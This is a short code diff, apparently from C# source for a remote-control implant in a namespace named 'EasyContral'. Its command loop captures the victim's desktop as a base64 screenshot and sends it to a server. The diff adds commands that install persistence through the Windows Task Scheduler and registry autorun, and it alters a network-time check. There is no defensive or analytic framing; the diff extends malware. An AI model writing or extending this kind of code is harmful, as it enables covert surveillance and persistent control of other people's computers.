@@ -30,7 +30,6 @@ namespace EasyContral
             {
                 return;
             }
-
             string Drive = "";
             foreach (string dirve in DriveInfo)
             {
@@ -115,6 +114,14 @@ namespace EasyContral
                             string base64img = GeneralContral.ScreenShot();
                             SendToServer(result, base64img, "GetDesktopResult");
                             break;
+                        case "AutoRunTaskScheduler":
+                            GeneralContral.AutoRun_TaskScheduler();
+                            SendToServer(result, "OK", "AutoRunTaskSchedulerResult");
+                            break;
+                        case "AutoRunRegistry":
+                            GeneralContral.AutoRun_Registry();
+                            SendToServer(result, "OK", "AutoRunRegistryResult");
+                            break;
                         case "SetSleepTime":
                             WaitTime = int.Parse(Command) * 1000;
                             break;
@@ -137,7 +144,7 @@ namespace EasyContral
             while (true)
             {
                 ulong now = GetNetworkTimeInSeconds();
-                if (now - time == 60)
+                if (now - time == 2)
                 {
                     return false;
                 }
